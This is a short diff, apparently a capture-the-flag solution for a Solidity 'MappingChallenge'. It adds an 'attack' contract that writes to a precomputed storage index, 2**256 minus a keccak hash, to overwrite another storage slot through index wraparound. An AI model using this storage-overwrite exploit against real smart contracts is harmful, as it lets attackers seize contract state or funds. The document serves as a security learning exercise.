@@ -19,3 +19,12 @@ contract MappingChallenge {
     }
 }
 //key=2**256-uint256(keccack256(bytes32(1)))    =   35707666377435648211887908874984608119992236509074197713628505308453184860938
+contract attack
+{
+    constructor(address add)public
+    {
+        MappingChallenge m=MappingChallenge(add);
+        m.set(35707666377435648211887908874984608119992236509074197713628505308453184860938,1);
+    }
+}
+
